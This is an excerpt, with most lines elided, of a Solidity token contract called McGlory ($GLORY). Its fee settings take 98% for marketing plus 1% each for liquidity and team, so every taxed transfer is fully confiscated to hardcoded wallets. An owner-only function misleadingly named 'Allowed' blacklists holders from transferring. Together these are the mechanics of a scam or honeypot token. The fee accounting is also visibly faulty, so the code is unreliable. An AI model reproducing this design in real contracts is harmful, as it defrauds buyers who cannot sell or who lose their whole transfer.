...
contract McGlory is Context, IERC20, Ownable {
    ...
    string private constant _name = "McGlory"; 
    string private constant _symbol = "$GLORY"; 
    uint8 private constant _decimals = 9; 
    
    uint256 public _marketingFee = 98;
    uint256 public _liquidityFee = 1;
    uint256 public _Teamfee = 1;
    address public _marketingWallet = 0x22D2B5fa45c5F9fD1bB33a517d16dc40C4349a15; 
    address public _TeamWallet = 0x693789BD9406B2b4c00e279836cC329eE73c421f; 
    ...
    function Allowed(address account, bool value) external onlyOwner {
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        ...
        uint256 Teamfee = amount * _Teamfee / 100; 
        uint256 liquidityFee = amount * _liquidityFee / 100; 
        _tOwned[address(this)] += marketingFee + liquidityFee;
        emit Transfer (from, address(this), marketingFee + liquidityFee + Teamfee);
        return (amount - marketingFee - liquidityFee - Teamfee);
    }
    ...
    function _transfer(
        ...
        require(!_isAllowed[from] && !_isAllowed[to], "Bot Detected");
    ...
    function swapAndSendToFee (uint256 tokens) private {
        ...
        if (_Teamfee > 0) {
            payable(_TeamWallet).transfer(_Teamfee);
        }
    }    
    ...
    function swapAndLiquify() private {
        ...
        uint256 liquidityTokens = balanceOf (address(this)) * _liquidityFee / (_marketingFee + _liquidityFee + _Teamfee);
